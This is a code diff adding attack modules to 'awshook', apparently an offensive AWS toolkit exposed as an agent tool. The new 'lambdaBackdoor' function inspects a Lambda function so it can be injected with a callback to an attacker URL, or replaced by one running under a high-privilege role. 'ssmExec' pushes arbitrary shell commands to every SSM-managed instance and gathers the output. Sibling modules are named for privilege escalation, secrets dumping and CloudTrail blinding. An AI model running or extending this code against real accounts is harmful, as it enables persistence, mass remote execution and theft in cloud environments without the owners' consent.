@@ -254,6 +254,68 @@ async function s3Dump(args: string[], timeout: number): Promise<HookResult> {
   return { output: output.join("\n"), findings: [] }
 }
 
+async function lambdaBackdoor(args: string[], timeout: number): Promise<HookResult> {
+  const funcName = argVal(args, "--function-name")
+  const callbackUrl = argVal(args, "--callback-url")
+  const method = argVal(args, "--method") || "inject"
+  const profile = argVal(args, "--profile")
+  const region = argVal(args, "--region")
+
+  if (!funcName) return { output: "ERROR: --function-name required", findings: [] }
+  if (!callbackUrl) return { output: "ERROR: --callback-url required", findings: [] }
+
+  if (method === "inject") {
+    const r = await aws(["lambda", "get-function", "--function-name", funcName], profile, region, timeout)
+    if (r.exitCode !== 0) return { output: `[-] Function not found: ${r.stderr.trim()}`, findings: [] }
+    const func = tryJson(r.stdout)
+    const cfg = func?.Configuration || {}
+    return { output: [`[*] Function: ${funcName}`, `[*] Runtime: ${cfg.Runtime}`, `[*] Role: ${cfg.Role}`, `[*] Handler: ${cfg.Handler}`, `[*] Code size: ${cfg.CodeSize} bytes`, `[+] Download code, inject callback to ${callbackUrl}, and update`].join("\n"), findings: [] }
+  }
+
+  return { output: [`[*] Create mode — would create new function '${funcName}'`, `[*] Callback: ${callbackUrl}`, `[+] Use: aws lambda create-function --function-name ${funcName} --runtime python3.11 --handler index.handler --role <HIGH_PRIV_ROLE_ARN> --zip-file fileb://payload.zip`].join("\n"), findings: [] }
+}
+
+async function ssmExec(args: string[], timeout: number): Promise<HookResult> {
+  const instanceId = argVal(args, "--instance-id")
+  const command = argVal(args, "--command")
+  const allInstances = hasFlag(args, "--all-instances")
+  const profile = argVal(args, "--profile")
+  const region = argVal(args, "--region")
+
+  if (!allInstances && !instanceId) return { output: "ERROR: --instance-id or --all-instances required", findings: [] }
+  if (!command) return { output: "ERROR: --command required", findings: [] }
+
+  const targets = allInstances
+    ? (async () => {
+        const r = await aws(["ssm", "describe-instance-information", "--query", "InstanceInformationList[].InstanceId"], profile, region, timeout)
+        return r.exitCode === 0 ? (tryJson(r.stdout) || []) : []
+      })()
+    : Promise.resolve([instanceId!])
+
+  const instances = await targets
+  if (instances.length === 0) return { output: "[-] No SSM-managed instances found", findings: [] }
+
+  const output = [`[*] SSM RunCommand — ${instances.length} target(s)\n`]
+  for (const id of instances) {
+    const r = await aws(["ssm", "send-command", "--instance-ids", id, "--document-name", "AWS-RunShellScript", "--parameters", `commands=["${command}"]`, "--query", "Command.CommandId"], profile, region, timeout)
+    if (r.exitCode === 0) {
+      const cmdId = tryJson(r.stdout)
+      output.push(`[+] ${id}: command sent (${cmdId})`)
+      await new Promise(resolve => setTimeout(resolve, 2000))
+      const gr = await aws(["ssm", "get-command-invocation", "--command-id", cmdId, "--instance-id", id], profile, region, timeout)
+      if (gr.exitCode === 0) {
+        const inv = tryJson(gr.stdout)
+        output.push(`    Status: ${inv?.Status}`)
+        if (inv?.StandardOutputContent) output.push(`    Output: ${inv.StandardOutputContent.slice(0, 500)}`)
+      }
+    } else {
+      output.push(`[-] ${id}: failed — ${r.stderr.trim().split("\n")[0]}`)
+    }
+  }
+
+  return { output: output.join("\n"), findings: [] }
+}
+
 async function stub(name: string): Promise<HookResult> {
   return { output: `[*] ${name}: not yet implemented in native TS`, findings: [] }
 }
@@ -290,8 +352,8 @@ export const AwshookTool = Tool.define("awshook", {
       iam_enum: () => iamEnum(params.args, params.timeout_seconds),
       iam_privesc: () => iamPrivesc(params.args, params.timeout_seconds),
       s3_dump: () => s3Dump(params.args, params.timeout_seconds),
-      lambda_backdoor: () => stub("lambda_backdoor"),
-      ssm_exec: () => stub("ssm_exec"),
+      lambda_backdoor: () => lambdaBackdoor(params.args, params.timeout_seconds),
+      ssm_exec: () => ssmExec(params.args, params.timeout_seconds),
       metadata_harvest: () => stub("metadata_harvest"),
       cloudtrail_blind: () => stub("cloudtrail_blind"),
       secrets_dump: () => stub("secrets_dump"),
